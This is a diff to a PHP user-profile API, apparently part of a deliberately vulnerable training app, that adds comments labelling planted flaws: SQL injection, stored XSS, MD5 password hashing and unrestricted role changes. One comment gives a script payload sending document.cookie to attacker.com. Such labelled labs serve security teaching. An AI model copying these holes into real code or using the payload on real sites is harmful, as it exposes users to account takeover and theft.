@@ -5,14 +5,13 @@ header("Access-Control-Allow-Headers: Content-Type, Authorization");
 
 // Database credentials
 $servername = "db";
-$username = "user";
-$password = "password";
-$dbname = "simple_app";
+$username   = "user";
+$password   = "password";
+$dbname     = "simple_app";
 
 // Connect to the database
 $conn = new mysqli($servername, $username, $password, $dbname);
 
-// Check connection
 if ($conn->connect_error) {
     http_response_code(500);
     echo json_encode(["message" => "Database connection failed"]);
@@ -29,7 +28,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         exit;
     }
 
-    $sql = "SELECT username, role FROM users WHERE id = $user_id";
+    // Vulnerability: SQL Injection (no parameterized query)
+    $sql    = "SELECT username, role, bio FROM users WHERE id = $user_id";
     $result = $conn->query($sql);
 
     if ($result->num_rows > 0) {
@@ -46,17 +46,46 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input = json_decode(file_get_contents('php://input'), true);
 
-    if (!isset($input['user_id'], $input['password'], $input['role'])) {
+    if (!isset($input['user_id'])) {
         http_response_code(400);
         echo json_encode(["message" => "Invalid input"]);
         exit;
     }
 
-    $user_id = $input['user_id'];
-    $password = $input['password'];
-    $role = $input['role'];  // Vulnerable: Role can be changed by modifying the request
+    $user_id  = $input['user_id'];
+    $password = $input['password'] ?? null;
+    $role     = $input['role']     ?? null;
 
-    $sql = "UPDATE users SET password = '$password', role = '$role' WHERE id = $user_id";
+    // Vulnerability #1: Stored XSS (A03)
+    // `bio` is stored directly without any HTML sanitization or encoding.
+    // When rendered via innerHTML on the profile page, any injected script executes.
+    // e.g. bio: "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
+    $bio = $input['bio'] ?? null;
+
+    // Build SET clause dynamically based on supplied fields
+    $setClauses = [];
+    if ($password !== null) {
+        // Vulnerability #10: Weak Crypto — MD5 instead of bcrypt
+        $hashed      = md5($password);
+        $setClauses[] = "password = '$hashed'";
+    }
+    if ($role !== null) {
+        // Vulnerability: role can be changed by any authenticated user
+        $setClauses[] = "role = '$role'";
+    }
+    if ($bio !== null) {
+        // Vulnerability #1: unsanitized bio stored verbatim
+        $setClauses[] = "bio = '$bio'";
+    }
+
+    if (empty($setClauses)) {
+        http_response_code(400);
+        echo json_encode(["message" => "No fields to update"]);
+        exit;
+    }
+
+    $setStr = implode(', ', $setClauses);
+    $sql    = "UPDATE users SET $setStr WHERE id = $user_id";
 
     if ($conn->query($sql)) {
         echo json_encode(["message" => "Profile updated successfully!"]);
